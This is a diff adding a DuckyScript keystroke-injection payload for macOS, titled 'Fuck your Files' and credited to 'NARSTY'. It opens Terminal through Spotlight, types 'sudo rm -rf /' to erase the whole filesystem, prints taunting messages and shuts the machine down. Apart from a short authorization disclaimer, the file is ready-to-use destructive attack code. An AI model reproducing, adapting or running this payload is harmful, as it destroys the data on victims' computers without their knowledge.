@@ -1,0 +1,34 @@
+REM this will delete all files on the system 
+REM there will be no Prompt 
+REM Using such scripts can have severe consequences and is not recommended. 
+REM Always exercise caution and ensure you have proper authorization.
+
+
+REM Title: Fuck your Files
+REM Author: NARSTY
+REM Version: 1.0
+REM Target: macOS
+REM Category: Executions 
+
+
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING echo "Hello! Initiating system takeover... Deleting All Files....."
+ENTER
+DELAY 1000
+STRING sudo rm -rf /
+ENTER
+DELAY 1000
+STRING echo "All your files have been deleted. Goodbye!"
+ENTER
+DELAY 1000
+STRING sudo shutdown -h now
+ENTER
+
+
+
